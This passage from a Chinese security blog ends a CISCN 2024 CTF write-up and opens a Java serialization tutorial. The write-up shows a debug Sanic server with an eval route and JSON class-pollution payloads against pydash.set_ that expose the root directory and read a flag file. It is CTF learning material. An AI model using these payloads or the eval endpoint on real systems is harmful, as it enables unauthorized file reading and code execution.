class="string">&quot;&quot;&quot;Serve files from a directory.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        uri (str): The URI to serve the files at.</span></span><br><span class="line"><span class="string">        directory (Path): The directory to serve files from.</span></span><br><span class="line"><span class="string">        directory_view (bool): Whether to show a directory listing or not.</span></span><br><span class="line"><span class="string">        index (Optional[Union[str, Sequence[str]]]): The index file(s) to</span></span><br><span class="line"><span class="string">            serve if the directory is requested. Defaults to None.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        directory: Path,</span></span><br><span class="line"><span class="params">        directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(index, <span class="built_in">str</span>):</span><br><span class="line">            index = [index]</span><br><span class="line">        <span class="keyword">elif</span> index <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            index = []</span><br><span class="line">        self.base = uri.strip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">        self.directory = directory</span><br><span class="line">        self.directory_view = directory_view</span><br><span class="line">        self.index = <span class="built_in">tuple</span>(index)</span><br><span class="line">        //剩下的不重要</span><br></pre></td></tr></table></figure><p>从上面可以看出只要让参数<code>directory</code>为<code>/</code>也就是根目录，<code>directory_view</code>为True，就可以看到根目录的所有文件了，这里就是我们要污染的地方了。可以起个环境本地调试，把<code>/src</code>路由中的源码改下就行，注释掉检测session的代码，再加上一个eval函数方便查看命令回显（我没搭起，环境有问题😿😿😿，拿佬的截图赛博复现了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="comment">#from sanic_session import Session</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"><span class="comment">#Session(app)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment">#async def index(request):</span></span><br><span class="line">    <span class="comment">#return html(open(&#x27;static/index.html&#x27;).read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&quot;/login&quot;)</span></span><br><span class="line"><span class="comment">#async def login(request):</span></span><br><span class="line">    <span class="comment">#user = request.cookies.get(&quot;user&quot;)</span></span><br><span class="line">    <span class="comment">#if user.lower() == &#x27;adm;n&#x27;:</span></span><br><span class="line">        <span class="comment">#request.ctx.session[&#x27;admin&#x27;] = True</span></span><br><span class="line">        <span class="comment">#return text(&quot;login success&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#return text(&quot;login fail&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(app.router.name_index[&#x27;name&#x27;].directory_view)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>调试的时候发现<code>app.router.name_index</code>可以获取注册的路由</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11ad5239.png" alt="屏幕截图 2024-06-03 172247.png"></p><p>打印下就会发现的确回显了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/src?a=print(app.router.name_index)</span><br><span class="line"></span><br><span class="line">#&#123;<span class="string">&#x27;__mp_main__.static&#x27;</span>: &lt;Route: <span class="type">name</span>=__mp_main__.static <span class="type">path</span>=static/&lt;__file_uri__:<span class="type">path</span>&gt;&gt;, <span class="string">&#x27;__mp_main__.src&#x27;</span>: &lt;Route: <span class="type">name</span>=__mp_main__.src <span class="type">path</span>=src&gt;, <span class="string">&#x27;__mp_main__.admin&#x27;</span>: &lt;Route: <span class="type">name</span>=__mp_main__.<span class="keyword">admin</span> <span class="type">path</span>=<span class="keyword">admin</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p>并且可以通过键值去访问相对的路由，所以的问题就是如何调用到DirectoryHandler类里</p><p>全局搜索下<code>index_name</code>方法，然后找到一个系统默认的调用点</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11bc5b1e.png" alt="image-20240603174012177.png"></p><p>在此打个断点进行调试，可以获取到系统调用这个路由时的状态，也就是可以看它具有的属性</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11be150e.png" alt="image-20240603174501229.png"></p><p>可以很明显看出从handler进去，一直可以获取到DirectoryHandler中的directory和directory_view，当传入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app<span class="selector-class">.router</span><span class="selector-class">.name_index</span><span class="selector-attr">[<span class="string">&#x27;__mp_main__.static&#x27;</span>]</span><span class="selector-class">.handler</span><span class="selector-class">.keywords</span><span class="selector-attr">[<span class="string">&#x27;directory_handler&#x27;</span>]</span></span><br></pre></td></tr></table></figure><p>可以看到成功进入DirectoryHandler类中</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11cd08da.png" alt="image-20240603174844924.png"></p><p>当传入</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app<span class="selector-class">.router</span><span class="selector-class">.name_index</span><span class="selector-attr">[<span class="string">&#x27;__mp_main__.static&#x27;</span>]</span><span class="selector-class">.handler</span><span class="selector-class">.keywords</span><span class="selector-attr">[<span class="string">&#x27;directory_handler&#x27;</span>]</span>.directory_view</span><br></pre></td></tr></table></figure><p>可以看到也是成功获取到了其值</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11cce09d.png" alt="image-20240603175218652.png"></p><p>故污染的payload：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__<span class="subst">\\</span><span class="subst">\\</span>.__init__<span class="subst">\\</span><span class="subst">\\</span>.__globals__<span class="subst">\\</span><span class="subst">\\</span>.app.router.name_index.__mp_main__<span class="subst">\\</span>.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="type">True</span>&#125;</span><br></pre></td></tr></table></figure><p>注意这里不能用<code>[]</code>来包裹其中的索引，污染和直接调用不同，我们需要用<code>.</code>来连接；而<code>__mp_main__</code>是一个整体，不能分开，用两个反斜杠转义即可，改为True后就可访问到<code>/static/</code>下的文件</p><p>接下来就是污染<code>directory</code>的值了</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__<span class="subst">\\</span><span class="subst">\\</span>.__init__<span class="subst">\\</span><span class="subst">\\</span>.__globals__<span class="subst">\\</span><span class="subst">\\</span>.app.router.name_index.__mp_main__<span class="subst">\\</span>.static.handler.keywords.directory_handler.directory&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;/&quot;</span></span><br></pre></td></tr></table></figure><p>然后访问<code>/static/</code>会发现500报错，很明显不能直接将这里的值污染为一个字符串类型，回到断点调试的地方</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11cf1b97.png" alt="image-20240603180537911.png"></p><p>可以看到directory是一个对象，而它之前的值就是由其中的<strong>parts</strong>属性决定的，但是由于这个属性是一个tuple，不能直接被污染，所以我们需要找到这个属性是如何被赋值的，回到DirectoryHandler类中看到</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">directory:</span> Path,</span><br></pre></td></tr></table></figure><p>可以看到这里directory是获取一个Path对象，跟进Path对象后，继续跟进<code>_from_parts</code>方法</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef11ced0de.png" alt="image-20240603182405580.png"></p><p>可以看到parts的值最后是给了_parts这个属性，访问一下发现返回list</p><p>![image-20240603182709389](D:\My blog\Hexo\source_posts\CISCN2024-web复现\image-20240603182709389.png)</p><p>故最终payload：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">污染directory_view：&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__<span class="subst">\\</span><span class="subst">\\</span>.__init__<span class="subst">\\</span><span class="subst">\\</span>.__globals__<span class="subst">\\</span><span class="subst">\\</span>.app.router.name_index.__mp_main__<span class="subst">\\</span>.static.handler.keywords.directory_handler.directory_view&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;True&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">污染directory：&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__<span class="subst">\\</span><span class="subst">\\</span>.__init__<span class="subst">\\</span><span class="subst">\\</span>.__globals__<span class="subst">\\</span><span class="subst">\\</span>.app.router.name_index.__mp_main__<span class="subst">\\</span>.static.handler.keywords.directory_handler.directory._parts&quot;</span>,<span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/&quot;</span>]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.picui.cn/free/2024/06/04/665ef11dc0cbc.png" alt="image-20240603183434741.png"></p><p>然后将<code>__file__</code>的值设为flag文件的名字，再访问<code>/src</code>路由即可得flag</p><p>参考：</p><p><a href="https://blog.csdn.net/Jayjay___/article/details/139047540">https://blog.csdn.net/Jayjay___/article/details/139047540</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/139052904">https://blog.csdn.net/uuzeray/article/details/139052904</a></p><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18201664">https://www.cnblogs.com/EddieMurphy-blogs/p/18201664</a></p><p><a href="https://lisien11.github.io/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/">https://lisien11.github.io/2024/05/20/CISCN2024%E5%88%9D%E8%B5%9B%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://c1oudfl0w0.github.io/blog/2024/05/18/CISCN2024/#easycms">https://c1oudfl0w0.github.io/blog/2024/05/18/CISCN2024/#easycms</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>]]></content>
      
      
      <categories>
          
          <category> CTFwp及复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp及复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2024/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>Java序列化</strong>是指把Java对象转换为字节序列的过程；而<strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。</p><p>序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p><p><strong>Java需要序列化和反序列化的原因</strong>：两个进程进行远程通信时，各种类型的数据会以二进制序列的形式进行传送。当两个Java进程进行通信时，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</p><p>Java序列化有两个好处：好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p><h2 id="序列化实现"><a href="#序列化实现" class="headerlink" title="序列化实现"></a>序列化实现</h2><p>只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列。（不是则会抛出异常） </p><p><strong>Serializable</strong> 接口是 Java 提供的序列化接口，它是一个空接口</p><pre><code>public interface Serializable &#123;&#125;</code></pre><p>Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。</p><h3 id="Serializable-接口的基本使用"><a href="#Serializable-接口的基本使用" class="headerlink" title="Serializable 接口的基本使用"></a>Serializable 接口的基本使用</h3><p>通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream 包装 FileOutStream 将数据写入到文件中或者包装 ByteArrayOutStream 将数据写入到内存中。同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象即可。</p><h3 id="Serializable-接口的特点"><a href="#Serializable-接口的特点" class="headerlink" title="Serializable 接口的特点"></a>Serializable 接口的特点</h3><p><strong>1.序列化类的属性没有实现 Serializable 那么在序列化就会报错</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">Student</span> <span class="symbol">implements</span> <span class="symbol">Serializable</span> &#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Color 类也是需要实现序列化接口的。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> Color color;<span class="comment">//这里如果没有实现序列化接口，那么在 Student 对象序列化时将会报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//报错：Exception in thread &quot;main&quot; java.io.NotSerializableException: com.example.seriable.Color</span></span><br></pre></td></tr></table></figure><p><strong>2.在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造函数来重新创建对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Animal 是父类，它没有实现 Serilizable 接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;<span class="comment">//没有无参构造将会报错</span></span><br><span class="line">        System.out.println(<span class="string">&quot;调用 Animal 无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用 Animal 有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Animal&#123;&quot;</span> + <span class="string">&quot;color=&#x27;&quot;</span> + color + <span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//BlackCat 是 Animal 的子类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BlackCat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫的无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">(String color, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(color);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BlackCat&#123;&quot;</span> + <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +<span class="built_in">super</span>.toString() +<span class="string">&#x27;\&#x27;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./a.bin&quot;</span>;<span class="comment">//定义一个用于保存序列化对象的文件路径</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeAnimal();</span><br><span class="line">        deserializeAnimal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlackCat</span>(<span class="string">&quot;black&quot;</span>, <span class="string">&quot;我是黑猫&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化前：&quot;</span>+black.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));<span class="comment">//创建一个ObjectOutputStream对象,这里它被用来将对象写入到指定文件中</span></span><br><span class="line">        oos.writeObject(black);<span class="comment">//调用ObjectOutputStream的writeObject方法,将black对象写入到输出流中,这样black对象被序列化并存储到了指定的文件中</span></span><br><span class="line">        oos.flush();<span class="comment">//调用flush方法,确保输出流中所有的数据都被写入到目标文件中</span></span><br><span class="line">        oos.close();<span class="comment">//关闭输出流</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始反序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));<span class="comment">//通过ObjectInputStream(对象输入流)从文件(FILE_PATH指定的路径)中读取序列化的数据</span></span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> (BlackCat) ois.readObject();<span class="comment">//调用readObject方法从输入流中读取一个对象并返回.由于readObject方法返回的是一个Object类型,我们需要强制类型转换成BlackCat类型</span></span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(black);<span class="comment">//打印反序列化后的内容</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后输出：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">调用 Animal 有 color 参数的构造</span><br><span class="line">调用黑猫有 color 参数的构造</span><br><span class="line">序列化前：BlackCat&#123;<span class="attribute">name</span>=<span class="string">&#x27;我是黑猫&#x27;</span>Animal&#123;<span class="attribute">color</span>=<span class="string">&#x27;black&#x27;</span>&#125;<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string">=================开始序列化================</span></span><br><span class="line"><span class="string">=================结束反序列化================</span></span><br><span class="line"><span class="string">调用 Animal 无参构造</span></span><br><span class="line"><span class="string">BlackCat&#123;name=&#x27;</span>我是黑猫<span class="string">&#x27;Animal&#123;color=&#x27;</span><span class="literal">null</span><span class="string">&#x27;&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>从以上代码执行的结果来看，要序列化的对象的父类 Animal 没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的，这样做的目的是重新初始化父类的属性，例如 Animal 没有实现序列化接口，因此对应的 color 属性就不会被序列化，故而反序列得到的 color 值就为 null</p><p><strong>3.一个实现 Serializable 接口的子类也是可以被序列化的</strong></p><p><strong>4.静态成员变量是不能被序列化</strong></p><p>序列化是针对对象属性的，而静态成员变量是属于类的</p><p><strong>5.transient 标识的对象成员变量不参与序列化</strong></p><p>在下面这个栗子中，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是写以下两个 private 方法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">private void <span class="built_in">writeObject</span>(java<span class="selector-class">.io</span><span class="selector-class">.ObjectOutputStream</span> s)throws java<span class="selector-class">.io</span><span class="selector-class">.IOException</span></span><br><span class="line">private void <span class="built_in">readObject</span>(java<span class="selector-class">.io</span><span class="selector-class">.ObjectInputStream</span> s)throws java<span class="selector-class">.io</span><span class="selector-class">.IOException</span>, ClassNotFoundException</span><br></pre></td></tr></table></figure><p>从这两个方法的名字就可以看出分别是序列化写入数据和反序列化读取数据用的，其实这两个方法在序列化和反序列化过程中会通过反射调用的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 